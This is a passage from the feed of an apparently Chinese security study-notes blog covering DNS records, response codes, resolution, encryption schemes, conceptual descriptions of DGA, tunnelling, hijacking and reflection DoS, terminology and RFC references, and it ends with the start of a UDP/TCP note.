&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;MX&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;电子邮件交换记录&lt;/li&gt;
&lt;li&gt;记录邮件域名对应的 IP 地址&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;响应码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#响应码&#34;&gt;#&lt;/a&gt; 响应码&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;NOERROR&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;No error condition
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;FORMERR&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;Format error - The name server was unable to interpret the query
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;SERVFAIL&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;Server failure - The name server was unable to process this query due to a problem with the name server
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;NXDOMAIN&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;this code signifies that the domain name referenced in the query does not exist
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;NOTIMP&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;Not Implemented - The name server does not support the requested kind of query
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;REFUSED&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;Refused - The name server refuses to perform the specified operation for policy reasons
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;NODATA&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;A pseudo RCODE which indicates that the name is valid, for the given class, but [there] are no records of the given type A NODATA response has to be inferred from the answer.
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;域名系统工作原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域名系统工作原理&#34;&gt;#&lt;/a&gt; 域名系统工作原理&lt;/h1&gt;
&lt;h2 id=&#34;解析过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#解析过程&#34;&gt;#&lt;/a&gt; 解析过程&lt;/h2&gt;
&lt;p&gt;DNS 解析过程是递归查询的，具体过程如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户要访问域名 www.example.com 时，先查看本机 hosts 是否有记录或者本机是否有 DNS 缓存，如果有，直接返回结果，否则向递归服务器查询该域名的 IP 地址&lt;/li&gt;
&lt;li&gt;递归缓存为空时，首先向根服务器查询 com 顶级域的 IP 地址&lt;/li&gt;
&lt;li&gt;根服务器告知递归服务器 com 顶级域名服务器的 IP 地址&lt;/li&gt;
&lt;li&gt;递归向 com 顶级域名服务器查询负责 example.com 的权威服务器的 IP&lt;/li&gt;
&lt;li&gt;com 顶级域名服务器返回相应的 IP 地址&lt;/li&gt;
&lt;li&gt;递归向 example.com 的权威服务器查询 www.example.com 的地址记录&lt;/li&gt;
&lt;li&gt;权威服务器告知 www.example.com 的地址记录&lt;/li&gt;
&lt;li&gt;递归服务器将查询结果返回客户端&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;域传送&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域传送&#34;&gt;#&lt;/a&gt; 域传送&lt;/h2&gt;
&lt;p&gt;DNS 服务器可以分为主服务器、备份服务器和缓存服务器。域传送是指备份服务器从主服务器拷贝数据，并使用得到的数据更新自身数据库。域传送是在主备服务器之间同步数据库的机制。&lt;/p&gt;
&lt;h1 id=&#34;服务器类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#服务器类型&#34;&gt;#&lt;/a&gt; 服务器类型&lt;/h1&gt;
&lt;h2 id=&#34;根服务器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#根服务器&#34;&gt;#&lt;/a&gt; 根服务器&lt;/h2&gt;
&lt;p&gt;根服务器是 DNS 的核心，负责互联网顶级域名的解析，用于维护域的权威信息，并将 DNS 查询引导到相应的域名服务器。&lt;/p&gt;
&lt;p&gt;根服务器在域名树中代表最顶级的  &lt;code&gt;.&lt;/code&gt;  域， 一般省略。&lt;/p&gt;
&lt;p&gt;13 台 IPv4 根服务器的域名标号为 a 到 m，即 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Eucm9vdC1zZXJ2ZXJzLm9yZw==&#34;&gt;a.root-servers.org&lt;/span&gt; 到 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL20ucm9vdC1zZXJ2ZXJzLm9yZw==&#34;&gt;m.root-servers.org&lt;/span&gt;，所有服务器存储的数据相同，仅包含 ICANN 批准的 TLD 域名权威信息。&lt;/p&gt;
&lt;h2 id=&#34;权威服务器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#权威服务器&#34;&gt;#&lt;/a&gt; 权威服务器&lt;/h2&gt;
&lt;p&gt;权威服务器上存储域名 Zone 文件，维护域内域名的权威信息，递归服务器可以从权威服务器获得 DNS 查询的资源记录。&lt;/p&gt;
&lt;p&gt;权威服务器需要在所承载的域名所属的 TLD 管理局注册，同一个权威服务器可以承载不同 TLD 域名，同一个域也可以有多个权威服务器。&lt;/p&gt;
&lt;h2 id=&#34;递归服务器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#递归服务器&#34;&gt;#&lt;/a&gt; 递归服务器&lt;/h2&gt;
&lt;p&gt;递归服务器负责接收用户的查询请求，进行递归查询并响应用户查询请求。在初始时递归服务器仅有记录了根域名的 Hint 文件。&lt;/p&gt;
&lt;h1 id=&#34;加密方案&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#加密方案&#34;&gt;#&lt;/a&gt; 加密方案&lt;/h1&gt;
&lt;p&gt;作为主流的防御方案，DNS 加密有五种方案，分别是 DNS-over-TLS (DoT)、DNS-over-DTLS、DNS-over-HTTPS (DoH)、DNS-over-QUIC 以及 DNSCrypt。&lt;/p&gt;
&lt;h2 id=&#34;dot&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dot&#34;&gt;#&lt;/a&gt; DoT&lt;/h2&gt;
&lt;p&gt;DoT 方案在 2016 年发表于 RFC7858，使用 853 端口。主要思想是 Client 和 Server 通过 TCP 协议建立 TLS 会话后再进行 DNS 传输，Client 通过 SSL 证书验证服务器身份。&lt;/p&gt;
&lt;h2 id=&#34;dns-over-dtls&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dns-over-dtls&#34;&gt;#&lt;/a&gt; DNS-over-DTLS&lt;/h2&gt;
&lt;p&gt;DNS-over-DTLS 和 DoT 类似，区别在于使用 UDP 协议而不是 TCP 协议。&lt;/p&gt;
&lt;h2 id=&#34;doh&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#doh&#34;&gt;#&lt;/a&gt; DoH&lt;/h2&gt;
&lt;p&gt;DoH 方案在发表 RFC8484，使用  &lt;code&gt;https://dns.example.com/dns-query&amp;#123;?dns&amp;#125;&lt;/code&gt;  来查询服务器的 IP，复用 https 的 443 端口，流量特征比较小。DoH 会对 DNS 服务器进行加密认证，不提供 fallback 选项。目前 Cloudflare、Google 等服务商对 DoH 提供了支持。&lt;/p&gt;
&lt;h2 id=&#34;dns-over-quic&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dns-over-quic&#34;&gt;#&lt;/a&gt; DNS-over-QUIC&lt;/h2&gt;
&lt;p&gt;DNS-over-QUIC 安全特性和 DoT 类似，但是性能更高，目前没有合适的软件实现。&lt;/p&gt;
&lt;h2 id=&#34;dnscrypt&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dnscrypt&#34;&gt;#&lt;/a&gt; DNSCrypt&lt;/h2&gt;
&lt;p&gt;DNSCrypt 使用 X25519-XSalsa20Poly1305 而非标准的 TLS，且 DNSCrypt 的 Client 需要额外的软件，Server 需要的专门的证书。&lt;/p&gt;
&lt;h1 id=&#34;dns利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dns利用&#34;&gt;#&lt;/a&gt; DNS 利用&lt;/h1&gt;
&lt;h2 id=&#34;dga&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dga&#34;&gt;#&lt;/a&gt; DGA&lt;/h2&gt;
&lt;p&gt;DGA（Domain Generate Algorithm，域名生成算法）是一种利用随机字符来生成 C&amp;amp;C 域名，从而逃避域名黑名单检测的技术手段，常见于 botnet 中。一般来说，一个 DGA 域名的存活时间约在 1-7 天左右。&lt;/p&gt;
&lt;p&gt;通信时，客户端和服务端都运行同一套 DGA 算法，生成相同的备选域名列表，当需要发动攻击的时候，选择其中少量进行注册，便可以建立通信，并且可以对注册的域名应用速变 IP 技术，快速变换 IP，从而域名和 IP 都可以进行快速变化。&lt;/p&gt;
&lt;p&gt;DGA 域名有多种生成方式，根据种子类型可以分为确定性和不确定性的生成。不确定性的种子可能会选用当天的一些即时数据，如汇率信息等。&lt;/p&gt;
&lt;h2 id=&#34;dns隧道&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dns隧道&#34;&gt;#&lt;/a&gt; DNS 隧道&lt;/h2&gt;
&lt;p&gt;DNS 隧道工具将进入隧道的其他协议流量封装到 DNS 协议内，在隧道上传输。这些数据包出隧道时进行解封装，还原数据。&lt;/p&gt;
&lt;h1 id=&#34;rdap&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rdap&#34;&gt;#&lt;/a&gt; RDAP&lt;/h1&gt;
&lt;p&gt;RDAP (Registration Data Access Protocol) 协议是 Whois 协议的后继，和 Whois 协议类似，RDAP 协议提供了域名、自治系统、IP 地址的信息查询。&lt;/p&gt;
&lt;h1 id=&#34;相关漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关漏洞&#34;&gt;#&lt;/a&gt; 相关漏洞&lt;/h1&gt;
&lt;h2 id=&#34;dns劫持&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dns劫持&#34;&gt;#&lt;/a&gt; DNS 劫持&lt;/h2&gt;
&lt;p&gt;DNS 劫持有多种方式，比较早期的攻击方式是通过攻击域名解析服务器，或是伪造 DNS 响应的方法，来将域名解析到恶意的 IP 地址。&lt;/p&gt;
&lt;p&gt;随着互联网应用的不断发展，出现了基于废弃记录的劫持方式。这种方式发生的场景是次级域名的解析记录指向第三方资源，而第三方资源被释放后，解析记录并没有取消，在这种场景下，可以对应申请第三方资源，以获取控制解析记录的能力。&lt;/p&gt;
&lt;h2 id=&#34;拒绝服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#拒绝服务&#34;&gt;#&lt;/a&gt; 拒绝服务&lt;/h2&gt;
&lt;p&gt;DNS 服务通常会开启 UDP 端口，当 DNS 服务器拥有大量二级域 NS 记录时，通过 DNS 的 UDP 反射攻击可以实现高倍的拒绝服务。&lt;/p&gt;
&lt;h1 id=&#34;相关机构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关机构&#34;&gt;#&lt;/a&gt; 相关机构&lt;/h1&gt;
&lt;h2 id=&#34;icann&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#icann&#34;&gt;#&lt;/a&gt; ICANN&lt;/h2&gt;
&lt;p&gt;互联网名称与数字地址分配机构 (Internet Corporation for Assigned Names and Numbers, ICANN) 创建于 1998 年 9 月 18 日，职能包括管理域名和 IP 地址的分配等与互联网相关的任务。&lt;/p&gt;
&lt;h2 id=&#34;iana&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#iana&#34;&gt;#&lt;/a&gt; IANA&lt;/h2&gt;
&lt;p&gt;互联网号码分配局 (Internet Assigned Numbers Authority, IANA) ，是一家互联网地址指派机构，管理国际互联网中使用的 IP 地址、域名和许多其它参数的机构。&lt;/p&gt;
&lt;h1 id=&#34;术语&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#术语&#34;&gt;#&lt;/a&gt; 术语&lt;/h1&gt;
&lt;h2 id=&#34;mdns&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mdns&#34;&gt;#&lt;/a&gt; mDNS&lt;/h2&gt;
&lt;p&gt;Multicast DNS (mDNS)，多播 DNS，使用 5353 端口，组播地址为  &lt;code&gt;224.0.0.251&lt;/code&gt;  或  &lt;code&gt;[FF02::FB]&lt;/code&gt;  。在一个没有常规 DNS 服务器的小型网络内可以使用 mDNS 来实现类似 DNS 的编程接口、包格式和操作语义。mDNS 协议的报文与 DNS 的报文结构相同，但有些字段对于 mDNS 来说有新的含义。&lt;/p&gt;
&lt;p&gt;启动 mDNS 的主机会在进入局域网后向所有主机组播消息，包含主机名、IP 等信息，其他拥有相应服务的主机也会响应含有主机名和 IP 的信息。&lt;/p&gt;
&lt;p&gt;mDNS 的域名是用  &lt;code&gt;.local&lt;/code&gt;  和普通域名区分开的。&lt;/p&gt;
&lt;h2 id=&#34;fqdn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#fqdn&#34;&gt;#&lt;/a&gt; FQDN&lt;/h2&gt;
&lt;p&gt;FQDN (Fully-Qualified Domain Name) 是域名的完全形态，主要是包含零长度的根标签，例如  &lt;code&gt;www.example.com.&lt;/code&gt;  。&lt;/p&gt;
&lt;h2 id=&#34;tld&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tld&#34;&gt;#&lt;/a&gt; TLD&lt;/h2&gt;
&lt;p&gt;Top-Level Domain (TLD) 是属于根域的一个域，例如  &lt;code&gt;com&lt;/code&gt;  或  &lt;code&gt;jp&lt;/code&gt;  。&lt;/p&gt;
&lt;p&gt;TLD 一般可以分为 Country Code Top-Level Domains (ccTLDs) 、Generic Top-Level Domains (gTLDs) 以及其它。&lt;/p&gt;
&lt;h2 id=&#34;idn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#idn&#34;&gt;#&lt;/a&gt; IDN&lt;/h2&gt;
&lt;p&gt;Internationalized Domain Names for Applications (IDNA) 是为了处理非 ASCII 字符的情况。&lt;/p&gt;
&lt;h2 id=&#34;cname&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cname&#34;&gt;#&lt;/a&gt; CNAME&lt;/h2&gt;
&lt;p&gt;CNAME 即 Canonical name，又称 alias，将域名指向另一个域名。&lt;/p&gt;
&lt;h2 id=&#34;ttl&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ttl&#34;&gt;#&lt;/a&gt; TTL&lt;/h2&gt;
&lt;p&gt;Time To Live，无符号整数，记录 DNS 记录过期的时间，最小是 0，最大是 2147483647 (2^31 - 1)。&lt;/p&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;h2 id=&#34;rfc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rfc&#34;&gt;#&lt;/a&gt; RFC&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucmZjLWVkaXRvci5vcmcvcmZjL3JmYzkyMA==&#34;&gt;RFC 920 Domain Requirements&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzEwMzQ=&#34;&gt;RFC 1034 DOMAIN NAMES CONCEPTS AND FACILITIES&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzEwMzU=&#34;&gt;RFC 1035 DOMAIN NAMES IMPLEMENTATION AND SPECIFICATION&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzExMjM=&#34;&gt;RFC 1123 Requirements for Internet Hosts -- Application and Support&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzI1MzU=&#34;&gt;RFC 2535 Domain Name System Security Extensions&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzI5MzA=&#34;&gt;RFC 2930 Secret Key Establishment for DNS (TKEY RR)&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzI5MzE=&#34;&gt;RFC 2931 DNS Request and Transaction Signatures ( SIG(0)s )&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzM1OTY=&#34;&gt;RFC 3596 Legacy Resolver Compatibility for Delegation Signer (DS)&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzM3NTU=&#34;&gt;RFC 3755 DNS Extensions to Support IP Version 6&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzUwMDE=&#34;&gt;RFC 5001 Automated Updates of DNS Security (DNSSEC) Trust Anchors&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzU5MzY=&#34;&gt;RFC 5936 DNS Zone Transfer Protocol&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzU5NjY=&#34;&gt;RFC 5966 DNS Transport over TCP - Implementation Requirements&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzYzNzY=&#34;&gt;RFC 6376 DomainKeys Identified Mail (DKIM) Signatures&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzY3NjI=&#34;&gt;RFC 6762 Multicast DNS&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzY4OTE=&#34;&gt;RFC 6891 Extension Mechanisms for DNS (EDNS(0))&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzY4OTU=&#34;&gt;RFC 6895 DNS IANA Considerations&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzc3NjY=&#34;&gt;RFC 7766 DNS Transport over TCP - Implementation Requirements&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzc4NTg=&#34;&gt;RFC 7858 Specification for DNS over Transport Layer Security (TLS)&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzc4NzE=&#34;&gt;RFC 7871 Client Subnet in DNS Queries&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzgwODI=&#34;&gt;RFC 8082 NXDOMAIN&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzg0ODI=&#34;&gt;RFC 8482 Providing Minimal-Sized Responses to DNS Queries That Have QTYPE=ANY&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzg0ODQ=&#34;&gt;RFC 8484 DNS Queries over HTTPS (DoH)&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzg0OTA=&#34;&gt;RFC 8490 DNS Stateful Operations&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzg0OTk=&#34;&gt;RFC 8499 DNS Terminology&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;whois-相关&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#whois-相关&#34;&gt;#&lt;/a&gt; Whois 相关&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzgxMg==&#34;&gt;RFC 812 NICNAME/WHOIS&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzk1NA==&#34;&gt;RFC 954 NICNAME/WHOIS&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzIxNjc=&#34;&gt;RFC 2167 Referral Whois (RWhois) Protocol V1.5&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzM5MTI=&#34;&gt;RFC 3912 WHOIS Protocol Specification&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzc0ODU=&#34;&gt;RFC 7485 Inventory and Analysis of WHOIS Registration Objects&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;rdap-相关&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rdap-相关&#34;&gt;#&lt;/a&gt; RDAP 相关&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzc0ODA=&#34;&gt;RFC7480 HTTP Usage in the Registration Data Access Protocol (RDAP)&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzc0ODE=&#34;&gt;RFC7481 Security Services for the Registration Data Access Protocol (RDAP)&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzc0ODQ=&#34;&gt;RFC7484 Finding the Authoritative Registration Data (RDAP) Service&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzgwNTY=&#34;&gt;RFC8056 Registration Data Access Protocol (RDAP) Object Tagging&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzkwODI=&#34;&gt;RFC9082 Registration Data Access Protocol (RDAP) Query Format&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzkwODM=&#34;&gt;RFC9083 JSON Responses for the Registration Data Access Protocol (RDAP)&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;相关标准&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关标准&#34;&gt;#&lt;/a&gt; 相关标准&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9hYm91dC5yZGFwLm9yZy8=&#34;&gt;Registration Data Access Protocol (RDAP)&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#工具&#34;&gt;#&lt;/a&gt; 工具&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL05MbmV0TGFicy91bmJvdW5k&#34;&gt;Unbound&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2lzYy1wcm9qZWN0cy9iaW5kOQ==&#34;&gt;bind9&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;研究文章&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#研究文章&#34;&gt;#&lt;/a&gt; 研究文章&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MveGJmMFFicHBrOFIwbng4OVBiNFlUZw==&#34;&gt;DGA 域名的今生前世：缘起、检测、与发展&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLnRoZWNqdy5tZS8/cD0xMjIx&#34;&gt;DNSSEC 原理和分析&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;Plohmann D, Yakdan K, Klatt M, et al. A comprehensive measurement study of domain generating malware[C]//25th {USENIX} Security Symposium ({USENIX} Security 16). 2016: 263-278.&lt;/li&gt;
&lt;li&gt;An End-to-End Large-Scale Measurement of DNS-over-Encryption: How Far Have We Come?&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;相关cve&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关cve&#34;&gt;#&lt;/a&gt; 相关 CVE&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yZXNlYXJjaC5jaGVja3BvaW50LmNvbS8yMDIwL3Jlc29sdmluZy15b3VyLXdheS1pbnRvLWRvbWFpbi1hZG1pbi1leHBsb2l0aW5nLWEtMTcteWVhci1vbGQtYnVnLWluLXdpbmRvd3MtZG5zLXNlcnZlcnMv&#34;&gt;SIGRed – Resolving Your Way into Domain Admin: Exploiting a 17 Year-old Bug in Windows DNS Servers&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/protocol/</guid>
            <title>网络协议</title>
            <link>https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/protocol/</link>
            <category>计算机网络</category>
            <category>网络协议</category>
            <pubDate>Thu, 24 Nov 2022 11:16:26 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;udp协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#udp协议&#34;&gt;#&lt;/a&gt; UDP 协议&lt;/h1&gt;
&lt;h2 id=&#34;主要特点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#主要特点&#34;&gt;#&lt;/a&gt; 主要特点&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;协议开销小、效率高。&lt;/li&gt;
&lt;li&gt;UDP 是无连接的，即发送数据之前不需要建立连接。&lt;/li&gt;
&lt;li&gt;UDP 使用尽最大努力交付，即不保证可靠交付。&lt;/li&gt;
&lt;li&gt;UDP 没有拥塞控制。&lt;/li&gt;
&lt;li&gt;UDP 支持一对一、一对多、多对一和多对多交互通信。&lt;/li&gt;
&lt;li&gt;UDP 的首部开销小，只有 8 个字节。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;tcp协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tcp协议&#34;&gt;#&lt;/a&gt; TCP 协议&lt;/h1&gt;
&lt;h2 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;TCP（Transmission Control Protocol，传输控制协议）是一种面向连接的、可靠的、基于字节流的传输层通信协议，由 RFC 793 定义。&lt;/p&gt;
